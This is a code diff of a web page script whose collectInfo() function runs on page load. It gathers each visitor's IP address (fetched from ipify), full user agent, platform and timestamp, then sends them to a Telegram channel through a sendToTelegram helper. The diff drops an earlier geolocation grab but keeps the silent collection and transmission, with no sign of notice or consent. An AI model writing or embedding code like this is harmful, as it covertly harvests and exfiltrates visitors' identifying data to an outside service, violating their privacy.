@@ -140,18 +140,15 @@
         });
     }
 
-    // Function to collect and send user information
-    async function collectInfo() {
-        // Get referrer information
-      //  const referrer = document.referrer || 'Direct visit';
-
-        // Get IP address
+     // Function to collect and send user information
+     async function collectInfo() {
         try {
+            // Get IP address
             const ipAddressResponse = await fetch('https://api64.ipify.org?format=json');
             const { ip } = await ipAddressResponse.json();
 
             // Get browser name and version
-            const browserInfo = `Browser: ${navigator.appName} ${navigator.appVersion}`;
+            const browserInfo = `Browser: ${navigator.userAgent}`;
 
             // Get device name
             const deviceInfo = `Device: ${navigator.platform}`;
@@ -159,28 +156,12 @@
             // Get timestamp
             const timestamp = new Date().toISOString();
 
-            // Try to get geolocation if user consents
-            navigator.geolocation.getCurrentPosition(
-                async function(position) {
-                    const { latitude, longitude } = position.coords;
-                    const geolocation = `Latitude: ${latitude}, Longitude: ${longitude}`;
-
-                    // Send collected information to Telegram
-                    sendToTelegram(`IP Address: ${ip}\nBrowser: ${browserInfo}\nDevice: ${deviceInfo}\nTimestamp: ${timestamp}\nGeolocation: ${geolocation}`);
-                },
-                async function(error) {
-                    console.error('Error getting geolocation:', error);
-                    // Send collected information without geolocation if user denies permission
-                    sendToTelegram(`IP Address: ${ip}\nBrowser: ${browserInfo}\nDevice: ${deviceInfo}\nTimestamp: ${timestamp}`);
-                }
-            );
+            // Send collected information to Telegram
+            sendToTelegram(`IP Address: ${ip}\nBrowser: ${browserInfo}\nDevice: ${deviceInfo}\nTimestamp: ${timestamp}`);
         } catch (error) {
-            console.error('Error getting IP address:', error);
-            // Send only referrer information to Telegram if IP address retrieval fails
-            // sendToTelegram(`Referrer: ${referrer}`);
+            console.error('Error collecting user info:', error);
         }
     }
-
     // Track page visit
     window.onload = async function() {
         await collectInfo();
